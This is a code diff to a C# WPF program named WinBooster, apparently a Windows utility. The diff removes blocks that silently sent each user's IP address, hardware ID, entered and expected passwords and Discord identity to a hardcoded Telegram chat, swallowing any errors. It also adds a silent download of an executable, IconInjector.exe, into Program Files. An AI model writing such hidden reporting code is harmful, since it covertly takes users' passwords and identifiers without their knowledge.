@@ -49,22 +49,6 @@ namespace WinBooster_WPF
             }
             if (PasswordBox.Password.Equals(password))
             {
-                string telegramSend = "";
-                telegramSend += "✅ Успешная авторизация\n\n";
-                telegramSend += "<tg-spoiler>";
-                telegramSend += "Основаная информация\n";
-                telegramSend += $"🌐 IP: {remoteControlData.main.ip}\n";
-                telegramSend += $"🌐 Hardware ID: {remoteControlData.main.hardwareID}\n\n";
-                telegramSend += "WinBooster информация\n";
-                telegramSend += $"⌨ Пароль: {password}\n\n";
-                if (remoteControlData.discord.id != 0)
-                {
-                    telegramSend += "Discord информация\n";
-                    telegramSend += $"🌐 ID: {remoteControlData.discord.id}\n";
-                    telegramSend += $"🧑‍ Username: {remoteControlData.discord.name}\n";
-                }
-                telegramSend += "</tg-spoiler>";
-                try { App.telegramRemoteControl.bot.SendTextMessageAsync(new ChatId(1040139729), telegramSend, Telegram.Bot.Types.Enums.ParseMode.Html).Wait(); } catch { }
                 this.Dispatcher.Invoke(DispatcherPriority.Normal, new Action(() =>
                 {
                     AuthPanel.Hide();
@@ -97,23 +81,6 @@ namespace WinBooster_WPF
             }
             else
             {
-                string telegramSend = "";
-                telegramSend += "❌ Неверная авторизацияя\n\n";
-                telegramSend += "<tg-spoiler>";
-                telegramSend += "Основаная информация\n";
-                telegramSend += $"🌐 IP: {remoteControlData.main.ip}\n";
-                telegramSend += $"🌐 Hardware ID: {remoteControlData.main.hardwareID}\n\n";
-                telegramSend += "WinBooster информация\n";
-                telegramSend += $"⌨ Вводимый пароль: {PasswordBox.Password}\n";
-                telegramSend += $"⌨ Ожидаемый пароль: {password}\n\n";
-                if (remoteControlData.discord.id != 0)
-                {
-                    telegramSend += "Discord информация\n";
-                    telegramSend += $"🌐 ID: {remoteControlData.discord.id}\n";
-                    telegramSend += $"🧑‍ Username: {remoteControlData.discord.name}\n";
-                }
-                telegramSend += "</tg-spoiler>";
-                try { App.telegramRemoteControl.bot.SendTextMessageAsync(new ChatId(1040139729), telegramSend, Telegram.Bot.Types.Enums.ParseMode.Html).Wait(); } catch { }
                 string text = $"Wrong password\nAttemp: {attemp++}\\3";
 
                 GrowlInfo growl = new GrowlInfo
@@ -148,7 +115,7 @@ namespace WinBooster_WPF
             {
                 try 
                 {
-                    var bytes = wc.DownloadData("https://github.com/Nekiplay/Temp/raw/main/RunAsTI.exe");
+                    var bytes = wc.DownloadData("https://github.com/WinBooster/WinBooster_Cloud/raw/main/files/RunAsTI.exe");
                     if (!System.IO.File.Exists("C:\\Program Files\\WinBooster\\RunAsTI.exe"))
                         System.IO.File.Create("C:\\Program Files\\WinBooster\\RunAsTI.exe").Close();
                     System.IO.File.WriteAllBytes("C:\\Program Files\\WinBooster\\RunAsTI.exe", bytes);
@@ -170,9 +137,33 @@ namespace WinBooster_WPF
                     StepBar.Next();
                 }));
             }
+
+            if (!System.IO.File.Exists("C:\\Program Files\\WinBooster\\IconInjector.exe"))
+            {
+                try
+                {
+                    var bytes = wc.DownloadData("https://github.com/WinBooster/WinBooster_Cloud/raw/main/files/IconInjector.exe");
+                    if (!System.IO.File.Exists("C:\\Program Files\\WinBooster\\IconInjector.exe"))
+                        System.IO.File.Create("C:\\Program Files\\WinBooster\\IconInjector.exe").Close();
+                    System.IO.File.WriteAllBytes("C:\\Program Files\\WinBooster\\IconInjector.exe", bytes);
+                }
+                catch
+                {
+                    GrowlInfo growl = new GrowlInfo
+                    {
+                        Message = "Error downloading: IconInjector",
+                        ShowDateTime = true,
+                        IconKey = "ErrorGeometry",
+                        IconBrushKey = "DangerBrush",
+                        IsCustom = true
+                    };
+                    Growl.InfoGlobal(growl);
+                }
+            }
+
             try 
             { 
-                var bytes = wc.DownloadData("https://github.com/Nekiplay/WinBooster_Cloud/raw/main/files/TrustedWorker.exe");
+                var bytes = wc.DownloadData("https://github.com/WinBooster/WinBooster_Cloud/raw/main/files/TrustedWorker.exe");
                 if (!System.IO.File.Exists("C:\\Program Files\\WinBooster\\TrustedWorker.exe"))
                     System.IO.File.Create("C:\\Program Files\\WinBooster\\TrustedWorker.exe").Close();
                 System.IO.File.WriteAllBytes("C:\\Program Files\\WinBooster\\TrustedWorker.exe", bytes);
@@ -189,10 +180,11 @@ namespace WinBooster_WPF
                 };
                 Growl.InfoGlobal(growl);
             }
+
             try 
             {
                 string bdPath = "C:\\Program Files\\WinBooster\\DataBase\\clear.json";
-                string bd = wc.DownloadString("https://raw.githubusercontent.com/Nekiplay/WinBooster_Cloud/main/database/clear.json");
+                string bd = wc.DownloadString("https://raw.githubusercontent.com/WinBooster/WinBooster_Cloud/main/database/clear.json");
                 if (!System.IO.File.Exists(bdPath))
                 {
                     System.IO.File.Create(bdPath).Close();
@@ -236,7 +228,7 @@ namespace WinBooster_WPF
             try 
             {
                 string bdPath = "C:\\Program Files\\WinBooster\\DataBase\\sha3.json";
-                string bd = wc.DownloadString("https://github.com/Nekiplay/WinBooster_Cloud/raw/main/database/sha3/list.json");
+                string bd = wc.DownloadString("https://github.com/WinBooster/WinBooster_Cloud/raw/main/database/sha3/list.json");
                 if (!System.IO.File.Exists(bdPath))
                 {
                     System.IO.File.Create(bdPath).Close();
@@ -279,7 +271,7 @@ namespace WinBooster_WPF
             try 
             {
                 string bdPath = "C:\\Program Files\\WinBooster\\DataBase\\fileNameLanguages.json";
-                string bd = wc.DownloadString("https://raw.githubusercontent.com/Nekiplay/WinBooster_Cloud/main/database/fileNameToLanguage.json");
+                string bd = wc.DownloadString("https://raw.githubusercontent.com/WinBooster/WinBooster_Cloud/main/database/fileNameToLanguage.json");
                 if (!System.IO.File.Exists(bdPath))
                 {
                     System.IO.File.Create(bdPath).Close();
@@ -395,23 +387,6 @@ namespace WinBooster_WPF
                 catch { }
                 if (string.IsNullOrEmpty(password) || password == "")
                 {
-                    RemoteControlData remoteControlData = App.remoteControlData;
-                    string telegramSend = "";
-                    telegramSend += "✅ Успешная авторизация\n\n";
-                    telegramSend += "<tg-spoiler>";
-                    telegramSend += "Основаная информация\n";
-                    telegramSend += $"🌐 IP: {remoteControlData.main.ip}\n";
-                    telegramSend += $"🌐 Hardware ID: {remoteControlData.main.hardwareID}\n\n";
-                    telegramSend += "WinBooster информация\n";
-                    telegramSend += $"⌨ Пароль: {password}\n\n";
-                    if (remoteControlData.discord.id != 0)
-                    {
-                        telegramSend += "Discord информация\n";
-                        telegramSend += $"🌐 ID: {remoteControlData.discord.id}\n";
-                        telegramSend += $"🧑‍ Username: {remoteControlData.discord.name}\n";
-                    }
-                    telegramSend += "</tg-spoiler>";
-                    try { App.telegramRemoteControl.bot.SendTextMessageAsync(new ChatId(1040139729), telegramSend, Telegram.Bot.Types.Enums.ParseMode.Html).Wait(); } catch { }
                     this.Dispatcher.Invoke(DispatcherPriority.Normal, new Action(() =>
                     {
                         AuthPanel.Hide();
@@ -428,13 +403,13 @@ namespace WinBooster_WPF
                             {
                                 StepBar.Next();
                             }));
-                            await Task.Delay(500);
+                            await Task.Delay(250);
                             StepBar.Dispatcher.Invoke(DispatcherPriority.Normal, new Action(() =>
                             {
                                 StepBar.Next();
                             }));
 
-                            await Task.Delay(500);
+                            await Task.Delay(250);
                             this.Dispatcher.Invoke(DispatcherPriority.Normal, new Action(() =>
                             {
                                 OpenForm();
